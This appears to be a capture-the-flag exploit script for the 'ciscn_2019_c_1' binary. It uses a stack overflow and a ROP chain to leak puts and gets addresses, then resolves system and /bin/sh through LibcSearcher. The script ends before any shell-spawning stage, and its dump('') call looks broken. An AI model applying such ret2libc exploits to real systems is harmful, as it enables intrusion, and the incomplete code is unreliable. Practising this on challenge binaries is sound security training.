from LibcSearcher import LibcSearcher
from pwn import *


def ciscn_2019_c_1(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_c_1'):
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target_elf = ELF(file_name)

    puts_plt = p64(target_elf.plt['puts'])
    gets_plt = p64(target_elf.plt['gets'])
    puts_got = p64(target_elf.got['puts'])
    gets_got = p64(target_elf.got['gets'])

    pop_ret_gadget = p64(0x400c83)  # pop rdi ; ret

    payload = b'A' * 88
    # puts(puts_got)
    payload += pop_ret_gadget + puts_got + puts_plt
    # puts(gets_got)
    payload += pop_ret_gadget + gets_got + puts_plt

    target.sendlineafter(b'choice!', b'1')
    target.sendlineafter(b'encrypted', payload)

    print(target.recv())
    print(target.recvline())
    print(target.recvuntil('\n'))
    puts_addr = int.from_bytes(target.recv(6), byteorder='little', signed=True)
    gets_addr = int.from_bytes(target.recv()[1:7], byteorder='little', signed=True)

    searcher = LibcSearcher('puts', puts_addr)
    searcher.add_condition('gets', gets_addr)

    libc_begin = puts_addr - searcher.dump('puts')
    system_addr = libc_begin + searcher.dump('system')
    bin_sh_addr = libc_begin + searcher.dump('')

if __name__ == '__main__':
    ciscn_2019_c_1()
